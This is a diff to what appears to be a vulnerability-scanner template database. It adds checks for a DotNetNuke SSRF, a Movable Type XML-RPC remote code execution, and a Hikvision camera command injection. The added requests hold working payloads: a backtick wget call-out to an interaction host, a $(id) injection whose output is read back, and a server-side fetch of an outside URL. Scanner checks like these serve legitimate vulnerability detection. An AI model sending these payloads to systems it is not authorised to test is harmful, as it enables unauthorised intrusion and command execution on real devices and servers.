@@ -11218,6 +11218,50 @@
       ]
     },
     {
+      "id": "CVE-2017-0929",
+      "info": {
+        "author": "charanrayudu,meme-lord",
+        "classification": {
+          "cve-id": "CVE-2017-0929",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-918"
+        },
+        "description": "DNN (aka DotNetNuke) before 9.2.0 suffers from a Server-Side Request Forgery (SSRF) vulnerability in the DnnImageHandler class. Attackers may be able to access information about internal network resources.",
+        "name": "DotNetNuke ImageHandler SSRF",
+        "reference": [
+          "https://hackerone.com/reports/482634",
+          "https://nvd.nist.gov/vuln/detail/CVE-2017-0929"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2017,oast,ssrf,dnn"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "status": [
+                500
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/DnnImageHandler.ashx?mode=file&url=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-1000028",
       "info": {
         "author": "pikpikcu",
@@ -30190,6 +30234,57 @@
       ]
     },
     {
+      "id": "CVE-2021-20837",
+      "info": {
+        "author": "dhiyaneshDK,hackergautam",
+        "classification": {
+          "cve-id": "CVE-2021-20837",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-78"
+        },
+        "description": "5002 and earlier (Movable Type Advanced 7 Series), Movable Type Advanced 6.8. 2 and earlier (Movable Type Advanced 6 Series), Movable Type Premium 1.46 and earlier, and Movable Type Premium Advanced 1.46 and earlier allow remote attackers to execute arbitrary OS commands via unspecified vectors.",
+        "name": "Unauthenticated RCE In MovableType",
+        "reference": [
+          "https://nemesis.sh/posts/movable-type-0day/",
+          "https://github.com/ghost-nemesis/cve-2021-20837-poc",
+          "https://twitter.com/cyber_advising/status/1454051725904580608",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-20837"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,rce,movable"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "failed loading package"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /cgi-bin/mt/mt-xmlrpc.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n  <methodName>mt.handler_to_coderef</methodName>\n  <params>\n    <param>\n      <value>\n        <base64>\n          {{base64(\"`wget http://{{interactsh-url}}`\")}}\n        </base64>\n      </value>\n    </param>\n  </params>\n</methodCall>\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-21234",
       "info": {
         "author": "gy741,pikpikcu",
@@ -35944,6 +36039,63 @@
       ]
     },
     {
+      "id": "CVE-2021-36260",
+      "info": {
+        "author": "pdteam,gy741",
+        "classification": {
+          "cve-id": "CVE-2021-36260",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-77,CWE-20"
+        },
+        "description": "A command injection vulnerability in the web server of some Hikvision product. Due to the insufficient input validation, attacker can exploit the vulnerability to launch a command injection attack by sending some messages with malicious commands.",
+        "metadata": {
+          "shodan-query": "http.favicon.hash:999357577"
+        },
+        "name": "Hikvision IP camera/NVR - Unauthenticated RCE",
+        "reference": [
+          "https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html",
+          "https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-36260",
+          "https://github.com/Aiminsun/CVE-2021-36260"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,hikvision,rce,iot,intrusive"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "regex": [
+                "(u|g)id=.*"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "dsl": [
+                "contains(body_2,'uid=') && contains(body_2,'gid=')"
+              ],
+              "type": "dsl"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "PUT /SDK/webLanguage HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(id>webLib/x)</language>\n",
+            "GET /x HTTP/1.1\nHost: {{Hostname}}\n"
+          ],
+          "req-condition": true
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-36380",
       "info": {
         "author": "gy741",
@@ -37437,13 +37589,19 @@
       "id": "CVE-2021-42258",
       "info": {
         "author": "dwisiswant0",
+        "classification": {
+          "cve-id": "CVE-2021-42258",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-89"
+        },
         "description": "BQE BillQuick Web Suite 2018 through 2021 before 22.0.9.1\nallows SQL injection for unauthenticated remote code execution,\nas exploited in the wild in October 2021 for ransomware installation.\nSQL injection can, for example, use the txtID (aka username) parameter.\nSuccessful exploitation can include the ability to execute\narbitrary code as MSSQLSERVER$ via xp_cmdshell.\n",
         "name": "BillQuick Web Suite SQLi",
         "reference": [
           "https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware",
           "https://nvd.nist.gov/vuln/detail/CVE-2021-42258"
         ],
-        "severity": "high",
+        "severity": "critical",
         "tags": "cve,cve2021,sqli,billquick"
       },
       "requests": [
